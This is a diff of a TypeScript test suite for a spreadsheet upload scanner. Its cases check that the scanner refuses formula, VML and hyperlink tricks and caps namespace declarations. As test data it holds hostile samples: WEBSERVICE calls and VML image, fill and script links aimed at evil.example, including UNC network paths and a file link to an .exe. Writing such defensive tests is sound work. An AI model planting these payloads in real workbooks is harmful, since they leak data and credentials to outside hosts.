@@ -7,6 +7,7 @@ import {
   DEFAULT_MAX_BYTES,
   DEFAULT_ROW_CAP,
   MAX_FORMULA_TEXT_LENGTH,
+  MAX_XMLNS_DECLARATIONS_PER_PART,
 } from './constants';
 import {
   assertSafeXmlContent,
@@ -64,6 +65,9 @@ const LONG_S = String.fromCodePoint(0x17f); // LATIN SMALL LETTER LONG S
 const BYTE_ORDER_MARK = String.fromCodePoint(0xfeff);
 // A Turkish sheet name: capital U with diaeresis, r, small u with diaeresis, nler.
 const URUNLER = `${String.fromCodePoint(0xdc)}r${String.fromCodePoint(0xfc)}nler`;
+// A Turkish pivot field name with a space: capital U with diaeresis, r, small u with
+// diaeresis, n, a space, Grubu.
+const URUN_GRUBU = `${String.fromCodePoint(0xdc)}r${String.fromCodePoint(0xfc)}n Grubu`;
 // From an ASCII capital letter to its full-width, its mathematical bold and its circled form.
 const FULL_WIDTH_OFFSET = 0xff21 - 0x41;
 const MATH_BOLD_OFFSET = 0x1d400 - 0x41;
@@ -384,6 +388,12 @@ describe('assertSafeXmlContent: formula fields', () => {
       '<CameraTool cellRange="A1"/>',
       UNSAFE_CONTENT_REASONS.UNSAFE_FORMULA,
     ],
+    ['a later script', '<x:ScriptText/>', UNSAFE_CONTENT_REASONS.UNSAFE_FORMULA],
+    [
+      'a later src attribute, even a relative one',
+      '<z src="x.png"/>',
+      UNSAFE_CONTENT_REASONS.UNSAFE_PART,
+    ],
   ])('refuses %s after markup the strict lexer cannot read', (_label, later, reason) => {
     const xml = worksheetWithCell('<v>1</v>').replace('<c r="A1">', `<c r="A1"t="n">${later}`);
 
@@ -524,6 +534,19 @@ describe('assertSafeXmlContent: the formula allow list', () => {
     ['a call of an INDEX result', 'INDEX(A1:A2,1)("x")'],
     ['a call of a structured reference', 'Table1[Col]("x")'],
     ['a call of an array constant', '{1,2}("x")'],
+    ['a chart data name called', '_xlchart.v1.0("x")'],
+    ['a chart data name called after white space', '_xlchart.v1.0 ("x")'],
+    ['a chart data name behind _xlfn.', '_xlfn._xlchart.v1.0'],
+    ['two backslashes', '\\\\'],
+    ['a backslash before a digit', 'SUM(\\1)'],
+    ['a backslash after a colon', 'A1:\\B1'],
+    ['a backslash after a backslash name', '\\a\\b'],
+    ['a backslash name calling WEBSERVICE', '\\WEBSERVICE("http://evil.example/")'],
+    ['a sheet right after a structured reference', 'Table1[x]Sheet1!A1'],
+    ['a sheet right after a bracketed number', 'x[1]Sheet1!A1'],
+    ['a digit right after a structured reference', 'Table1[x]1'],
+    ['a backslash name right after a structured reference', 'Table1[x]\\Name'],
+    ['an item selector after a quoted sheet name', `'${URUN_GRUBU}'[Elektronik]*1.1`],
   ])('refuses %s', (_label, text) => {
     expectUnsafeFormula(formulaError(text));
   });
@@ -567,6 +590,15 @@ describe('assertSafeXmlContent: the formula allow list', () => {
     ['a sum over a defined name of this workbook', 'SUM([0]!_Satis)'],
     ['an intersection of two parenthesised ranges', 'SUM((A1:B2) (B1:C2))'],
     ['a backslash in a string literal', 'IF(A1="C:\\temp",1,2)'],
+    ['a chart data name', '_xlchart.v1.0'],
+    ['an intersection of two chart data names', '_xlchart.v1.0 _xlchart.v5.12'],
+    ['a sum over a defined name that starts with a backslash', 'SUM(\\Fiyatlar)'],
+    ['a shortcut macro name', '\\a'],
+    ['a sheet-level name that starts with a backslash', 'Sheet1!\\a'],
+    ['a table name that starts with a backslash', '\\Fiyatlar[Fiyat]*2'],
+    ['a backslash name after an operator', 'A1*\\_Oran'],
+    ['a structured reference times two', 'Table1[Fiyat]*2'],
+    ['a structured reference before white space', 'Table1[Fiyat] Table1[Adet]'],
   ])('accepts %s', (_label, text) => {
     expect(formulaError(text)).toBeNull();
   });
@@ -745,6 +777,14 @@ const PIVOT_FIELD_REFUSALS: readonly LabelledXml[] = [
   ['holding a quoted field name that never closes', "'Fiyat/Adet*2"],
 ];
 
+// Levels of elements that declare no namespace, opened around an Office Math fraction.
+const DEEP_NESTING = 1000;
+
+/** `inner` inside DEEP_NESTING levels of elements that declare no namespace. */
+function deeplyNested(inner: string): string {
+  return `${'<g>'.repeat(DEEP_NESTING)}${inner}${'</g>'.repeat(DEEP_NESTING)}`;
+}
+
 // Worksheet content after the sheet data whose `m:f` is a formula field: its prefix does
 // not name the OMML namespace where it stands, or the walk cannot tell.
 const OMML_FIELD_REFUSALS: readonly LabelledXml[] = [
@@ -773,6 +813,112 @@ const OMML_FIELD_REFUSALS: readonly LabelledXml[] = [
     'whose OMML namespace is written with a reference',
     `<a xmlns:m="&#104;${OMML_NS.slice(1)}"><m:f>${EVIL_CALL}</m:f></a>`,
   ],
+  [
+    'past an end tag at the level of the element binding OMML that names another one',
+    `<a xmlns:m="${OMML_NS}"><b></b></c><m:f>${EVIL_CALL}</m:f>`,
+  ],
+  [
+    'after the element binding OMML closed past deep nesting',
+    `<a xmlns:m="${OMML_NS}">${deeplyNested(OMML_FRACTION)}</a><m:f>${EVIL_CALL}</m:f>`,
+  ],
+];
+
+const REVISION_LOG_PART = 'xl/revisions/revisionLog1.xml';
+const CHART_EX_PART = 'xl/charts/chartEx1.xml';
+const CHART_EX_NS = 'http://schemas.microsoft.com/office/drawing/2014/chartex';
+
+/** A shared workbook revision log whose one defined name revision holds `fields`. */
+function revisionLogWith(fields: string): string {
+  return (
+    `${UTF8_DECLARATION}<revisions xmlns="${SPREADSHEET_NS}" xmlns:r="${OFFICE_RELATIONSHIPS_NS}">` +
+    `<rdn rId="1" localSheetId="0" name="Liste">${fields}</rdn></revisions>`
+  );
+}
+
+/** An Excel 2016+ chart (chartEx) whose data reads the formula `formula` (XML text). */
+function chartExWith(formula: string): string {
+  return (
+    `${UTF8_DECLARATION}<cx:chartSpace xmlns:cx="${CHART_EX_NS}"><cx:chartData><cx:data id="0">` +
+    `<cx:numDim type="val"><cx:f>${formula}</cx:f><cx:lvl ptCount="1"><cx:pt idx="0">1</cx:pt></cx:lvl>` +
+    '</cx:numDim></cx:data></cx:chartData></cx:chartSpace>'
+  );
+}
+
+// Fragments of an external hyperlink's URL that Excel keeps in its `location`
+// (https://site/page#part); each one is a formula the scan refuses.
+const URL_FRAGMENTS: readonly string[] = [':~:text=Kargo (Bedava)', "Ali's", '/products(detail)'];
+
+/** Worksheet hyperlinks: one with `attributes` and the location `location` (XML text). */
+function hyperlinkWith(attributes: string, location: string): string {
+  return `<hyperlinks><hyperlink ref="A1" ${attributes} location="${location}" display="x"/></hyperlinks>`;
+}
+
+/** A VML drawing (no declaration, an `xml` root) holding `shapes`. */
+function vmlShapes(shapes: string): string {
+  return `<xml ${VML_NAMESPACES}>${shapes}</xml>`;
+}
+
+// A comment's VML shape as Excel writes it: no src, no href.
+const VML_COMMENT = vmlShapes(
+  '<o:shapelayout v:ext="edit"><o:idmap v:ext="edit" data="1"/></o:shapelayout>' +
+    '<v:shapetype id="_x0000_t202" coordsize="21600,21600" o:spt="202" path="m,l,21600r21600,l21600,xe">' +
+    '<v:stroke joinstyle="miter"/><v:path gradientshapeok="t" o:connecttype="rect"/></v:shapetype>' +
+    '<v:shape id="_x0000_s1025" type="#_x0000_t202" style="position:absolute;margin-left:59.25pt;' +
+    'margin-top:1.5pt;width:108pt;height:59.25pt;z-index:1;visibility:hidden" fillcolor="#ffffe1" o:insetmode="auto">' +
+    '<v:fill color2="#ffffe1"/><v:shadow on="t" color="black" obscured="t"/><v:path o:connecttype="none"/>' +
+    '<v:textbox style="mso-direction-alt:auto"><div style="text-align:left"></div></v:textbox>' +
+    '<x:ClientData ObjectType="Note"><x:MoveWithCells/><x:SizeWithCells/>' +
+    '<x:Anchor>1, 15, 0, 2, 3, 15, 3, 16</x:Anchor><x:AutoFill>False</x:AutoFill>' +
+    '<x:Row>0</x:Row><x:Column>0</x:Column></x:ClientData></v:shape>',
+);
+
+// A header picture's VML shape as Excel writes it: the image through a relationship.
+const VML_HEADER_IMAGE = vmlShapes(
+  '<o:shapelayout v:ext="edit"><o:idmap v:ext="edit" data="1"/></o:shapelayout>' +
+    '<v:shapetype id="_x0000_t75" coordsize="21600,21600" o:spt="75" o:preferrelative="t" ' +
+    'path="m@4@5l@4@11@9@11@9@5xe" filled="f" stroked="f"><v:stroke joinstyle="miter"/>' +
+    '<v:formulas><v:f eqn="if lineDrawn pixelLineWidth 0"/><v:f eqn="sum @0 1 0"/></v:formulas>' +
+    '<v:path o:extrusionok="f" gradientshapeok="t" o:connecttype="rect"/><o:lock v:ext="edit" aspectratio="t"/>' +
+    '</v:shapetype><v:shape id="LH" o:spid="_x0000_s1025" type="#_x0000_t75" ' +
+    'style="position:absolute;width:30pt;height:30pt;z-index:1"><v:imagedata o:relid="rId1" o:title="logo"/>' +
+    '<o:lock v:ext="edit" rotation="t"/></v:shape>',
+);
+
+// VML shapes whose src or href names something outside the package.
+const VML_URL_REFUSALS: readonly LabelledXml[] = [
+  [
+    'a VML image whose src is a network path',
+    '<v:shape id="h" type="#_x0000_t75"><v:imagedata src="\\\\evil.example\\s\\logo.png" o:title="logo"/></v:shape>',
+  ],
+  [
+    'a VML image whose src is a web address',
+    '<v:shape id="h" type="#_x0000_t75"><v:imagedata src="http://evil.example/logo.png"/></v:shape>',
+  ],
+  [
+    'a VML image whose o:href is a file URL',
+    '<v:shape id="h" type="#_x0000_t75"><v:imagedata o:relid="rId9" o:href="file:///\\\\evil.example\\s\\x.png"/></v:shape>',
+  ],
+  [
+    'a VML comment background filled from a network path',
+    '<v:shape id="c" type="#_x0000_t202"><v:fill src="\\\\evil.example\\s\\bg.png" type="frame"/></v:shape>',
+  ],
+  [
+    'a VML shape linking to a file',
+    '<v:shape id="s" type="#_x0000_t75" href="file:///\\\\evil.example\\s\\x.exe"/>',
+  ],
+  ['a src that starts with two slashes', '<v:imagedata src="//evil.example/x.png"/>'],
+  ['a src with a drive letter', '<v:imagedata src="C:/x.png"/>'],
+  ['a src with a drive letter written with a bar', '<v:imagedata src="C|/x.png"/>'],
+  [
+    'a src whose scheme hides behind white space and a tab',
+    '<v:imagedata src=" ht&#9;tp://evil.example/x.png"/>',
+  ],
+  [
+    'a src whose colon is a character reference',
+    '<v:imagedata src="http&#58;//evil.example/x.png"/>',
+  ],
+  ['a src holding a backslash after a relative start', '<v:imagedata src="media\\x.png"/>'],
+  ['an href in another case', '<v:shape id="s" HREF="mailto:a@evil.example"/>'],
 ];
 
 /** A line chart whose one series reads its values from the formula `formula` (XML text). */
@@ -973,6 +1119,79 @@ describe('assertSafeXmlContent: formula fields in every part', () => {
       'xl/worksheets/sheet7.xml',
       `${UTF8_DECLARATION}<x/>${worksheetWithFormula('<f>WEBSERVICE("x")</f>').slice(UTF8_DECLARATION.length)}`,
     ],
+    [
+      'an f past an end tag with no element open',
+      DRAWING_PART,
+      `${UTF8_DECLARATION}<a xmlns:m="${OMML_NS}"></a></b><c xmlns:m="${OMML_NS}"><m:f>${EVIL_CALL}</m:f></c>`,
+    ],
+    [
+      'a revision log old formula calling WEBSERVICE',
+      REVISION_LOG_PART,
+      revisionLogWith(`<formula>S!$A$1</formula><oldFormula>${EVIL_CALL}</oldFormula>`),
+    ],
+    [
+      'a chart data name called in an Excel 2016+ chart',
+      CHART_EX_PART,
+      chartExWith('_xlchart.v1.0(&quot;x&quot;)'),
+    ],
+    ...URL_FRAGMENTS.map((location): [string, string, string] => [
+      `a hyperlink location ${location} without a relationship id`,
+      SHEET_PART,
+      worksheetWithAfter(hyperlinkWith('', location)),
+    ]),
+    [
+      'a hyperlink location whose r prefix the hyperlink binds to another namespace',
+      SHEET_PART,
+      worksheetWithAfter(hyperlinkWith('xmlns:r="urn:x" r:id="rId1"', EVIL_CALL)),
+    ],
+    [
+      'a hyperlink location beside an id without a prefix',
+      SHEET_PART,
+      worksheetWithAfter(hyperlinkWith('id="rId1"', EVIL_CALL)),
+    ],
+    [
+      'a hyperlink location beside an empty relationship id',
+      SHEET_PART,
+      worksheetWithAfter(hyperlinkWith('r:id=""', EVIL_CALL)),
+    ],
+    [
+      'a hyperlink location beside a relationship id in another case',
+      SHEET_PART,
+      worksheetWithAfter(hyperlinkWith('r:ID="rId1"', EVIL_CALL)),
+    ],
+    [
+      'a hyperlink location with a relationship id past an end tag that closes the root early',
+      SHEET_PART,
+      worksheetWithAfter(`<a></worksheet>${hyperlinkWith('r:id="rId1"', EVIL_CALL)}</a>`),
+    ],
+    [
+      'a pivot calculated item whose item selector never closes',
+      PIVOT_TABLE_PART,
+      pivotTableWith(
+        `<calculatedItem formula="'${URUN_GRUBU}'[Elektronik*1.1"><pivotArea/></calculatedItem>`,
+      ),
+    ],
+    [
+      'a pivot calculated item with a sheet right after its item selector',
+      PIVOT_TABLE_PART,
+      pivotTableWith(
+        `<calculatedItem formula="'${URUN_GRUBU}'[x]Sheet1!A1"><pivotArea/></calculatedItem>`,
+      ),
+    ],
+    [
+      'a pivot calculated item calling WEBSERVICE after an item selector',
+      PIVOT_TABLE_PART,
+      pivotTableWith(
+        `<calculatedItem formula="'${URUN_GRUBU}'[x]*${EVIL_CALL}"><pivotArea/></calculatedItem>`,
+      ),
+    ],
+    [
+      'a VML script',
+      VML_PART,
+      vmlWith('<x:ScriptText>window.open(&quot;http://evil.example/&quot;)</x:ScriptText>'),
+    ],
+    ['a VML script holding a comment', VML_PART, vmlWith('<x:ScriptText><!--s--></x:ScriptText>')],
+    ['a VML script in another case', VML_PART, vmlWith('<x:scripttext>x</x:scripttext>')],
   ])('refuses %s', (_label, entry, xml) => {
     expectUnsafeFormula(scanError(entriesOf({ [entry]: xml })), entry);
   });
@@ -1006,6 +1225,18 @@ describe('assertSafeXmlContent: formula fields in every part', () => {
       WORKBOOK_PART,
       workbookWith(
         '<webPublishObjects count="1"><webPublishObject id="1" divId="d" destinationFile="http://evil.example/drop.htm" autoRepublish="1"/></webPublishObjects>',
+      ),
+    ],
+    ...VML_URL_REFUSALS.map(([label, shapes]): [string, string, string] => [
+      label,
+      VML_PART,
+      vmlShapes(shapes),
+    ]),
+    [
+      'an xlink:href to a web page in a drawing',
+      DRAWING_PART,
+      drawingWith(
+        '<a:x xmlns:a="urn:a" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://evil.example/"/>',
       ),
     ],
   ])('refuses %s as unsafe-part', (_label, entry, xml) => {
@@ -1147,8 +1378,115 @@ describe('assertSafeXmlContent: formula fields in every part', () => {
       DRAWING_PART,
       drawingWith(`<oMath xmlns="${OMML_NS}"><f><fPr/><num/><den/></f></oMath>`),
     ],
+    [
+      'an Office Math fraction deep inside the element binding OMML',
+      DRAWING_PART,
+      drawingWith(
+        `<a14:m xmlns:a14="urn:a14" xmlns:m="${OMML_NS}">${deeplyNested(OMML_FRACTION)}</a14:m>`,
+      ),
+    ],
+    ...URL_FRAGMENTS.map((location): [string, string, string] => [
+      `a hyperlink with a relationship id whose location keeps the URL fragment ${location}`,
+      SHEET_PART,
+      worksheetWithAfter(hyperlinkWith('r:id="rId1"', location)),
+    ]),
+    [
+      'a hyperlink with a relationship id whose prefix the hyperlink binds',
+      SHEET_PART,
+      worksheetWithAfter(
+        hyperlinkWith(`xmlns:rel="${OFFICE_RELATIONSHIPS_NS}" rel:id="rId1"`, "Ali's"),
+      ),
+    ],
+    ['the data names of an Excel 2016+ chart', CHART_EX_PART, chartExWith('_xlchart.v1.0')],
+    [
+      'a revision log old formula holding a range',
+      REVISION_LOG_PART,
+      revisionLogWith('<formula>S!$A$1</formula><oldFormula>S!$A$1:$A$9</oldFormula>'),
+    ],
+    [
+      'pivot calculated items naming items of a quoted field',
+      PIVOT_TABLE_PART,
+      pivotTableWith(
+        `<calculatedItem formula="'${URUN_GRUBU}'[Elektronik]*1.1"><pivotArea/></calculatedItem>` +
+          `<calculatedItem formula="'${URUN_GRUBU}'[-1]"><pivotArea/></calculatedItem>` +
+          `<calculatedItem formula="'${URUN_GRUBU}'['[x']]+Grup[Ev]"><pivotArea/></calculatedItem>`,
+      ),
+    ],
+    ['a VML comment shape as Excel writes it', VML_PART, VML_COMMENT],
+    ['a VML header image as Excel writes it', VML_PART, VML_HEADER_IMAGE],
+    [
+      'relative VML image, fill and shape links',
+      VML_PART,
+      vmlShapes(
+        '<v:shape id="h" type="#_x0000_t75" href="#Sheet1!A1"><v:imagedata src="../media/image1.png" o:title=""/>' +
+          '<v:fill src="media/bg.png" type="frame"/></v:shape><v:shape id="e" src=""/>',
+      ),
+    ],
+    ['empty VML scripts', VML_PART, vmlWith('<x:ScriptText/><x:ScriptText> \n </x:ScriptText>')],
   ])('accepts %s', (_label, entry, xml) => {
     expect(scanError(entriesOf({ [entry]: xml }))).toBeNull();
+  });
+});
+
+const NAMESPACE_PART = 'xl/custom/ns.xml';
+
+/** A part whose root holds `count` nested elements, each declaring one namespace. */
+function nestedDeclarations(count: number): string {
+  return `<r>${'<e xmlns:p="u">'.repeat(count)}${'</e>'.repeat(count)}</r>`;
+}
+
+/** A part whose one element declares `count` distinct prefixes. */
+function prefixesOnOneElement(count: number): string {
+  const declarations = Array.from({ length: count }, (_, index) => ` xmlns:p${index}="u"`);
+  return `<r><e${declarations.join('')}/></r>`;
+}
+
+/** A part whose root holds `count` sibling elements, each declaring one namespace. */
+function siblingDeclarations(count: number): string {
+  return `<r>${'<e xmlns:p="u"/>'.repeat(count)}</r>`;
+}
+
+function expectTooManyNamespaceDeclarations(error: SpreadsheetFileError | null): void {
+  expect(error?.code).toBe('UNSAFE_CONTENT');
+  expect(error?.meta).toEqual({ entry: NAMESPACE_PART, cap: MAX_XMLNS_DECLARATIONS_PER_PART });
+  expect(error?.message).toBe(
+    `Workbook part '${NAMESPACE_PART}' has more than ${MAX_XMLNS_DECLARATIONS_PER_PART} namespace declarations`,
+  );
+}
+
+// The walk keeps an entry per element that declares namespaces, never per open
+// element, so its memory is bounded by the declaration cap every kept XML part is held
+// to, with the error the reader parts get for it.
+describe('assertSafeXmlContent: namespace declarations', () => {
+  it.each([
+    ['nested', nestedDeclarations],
+    ['on one element', prefixesOnOneElement],
+    ['on sibling elements', siblingDeclarations],
+  ])('accepts declarations %s up to the cap and refuses one more', (_label, part) => {
+    const atCap = scanError(entriesOf({ [NAMESPACE_PART]: part(MAX_XMLNS_DECLARATIONS_PER_PART) }));
+    const overCap = scanError(
+      entriesOf({ [NAMESPACE_PART]: part(MAX_XMLNS_DECLARATIONS_PER_PART + 1) }),
+    );
+
+    expect(atCap).toBeNull();
+    expectTooManyNamespaceDeclarations(overCap);
+  });
+
+  it('counts the declarations past nesting the walk cannot follow', () => {
+    const part = `<a></a></b>${siblingDeclarations(MAX_XMLNS_DECLARATIONS_PER_PART + 1)}`;
+
+    expectTooManyNamespaceDeclarations(scanError(entriesOf({ [NAMESPACE_PART]: part })));
+  });
+
+  it('follows the bindings through deep nesting', () => {
+    const depth = 100_000;
+    const nested = (inner: string): string =>
+      `${'<g>'.repeat(depth)}${inner}${'</g>'.repeat(depth)}`;
+    const fraction = `<r xmlns:m="${OMML_NS}">${nested(OMML_FRACTION)}</r>`;
+    const afterClose = `<r><a xmlns:m="${OMML_NS}">${nested('')}</a><m:f>${EVIL_CALL}</m:f></r>`;
+
+    expect(scanError(entriesOf({ [NAMESPACE_PART]: fraction }))).toBeNull();
+    expectUnsafeFormula(scanError(entriesOf({ [NAMESPACE_PART]: afterClose })), NAMESPACE_PART);
   });
 });
 
@@ -1380,6 +1718,27 @@ describe('upload gate: every kept worksheet part is scanned', () => {
 });
 
 /** `text` as bytes: each code unit one byte (every code unit here is below 0x100). */
+const HYPERLINK_REL_TYPE = `${OFFICE_RELATIONSHIPS_NS}/hyperlink`;
+
+/** A one-sheet workbook whose hyperlink leads to a web page and keeps `location`. */
+function bookWithWebHyperlink(location: string): Buffer {
+  return buildXlsxFixture(
+    [{ name: 'Sheet1', xml: worksheetWithAfter(hyperlinkWith('r:id="rId1"', location)) }],
+    {
+      'xl/worksheets/_rels/sheet1.xml.rels':
+        `${UTF8_DECLARATION}<Relationships xmlns="${RELATIONSHIPS_NS}">` +
+        `<Relationship Id="rId1" Type="${HYPERLINK_REL_TYPE}" Target="https://www.example.com/urun/123" TargetMode="External"/>` +
+        '</Relationships>',
+    },
+  );
+}
+
+describe('upload gate: hyperlinks to web pages', () => {
+  it.each(URL_FRAGMENTS)('accepts the URL fragment %s in the location', (location) => {
+    expect(gateError(bookWithWebHyperlink(location))).toBeNull();
+  });
+});
+
 function latin1Bytes(text: string): Uint8Array<ArrayBuffer> {
   return Uint8Array.from(text, (character) => character.charCodeAt(0));
 }
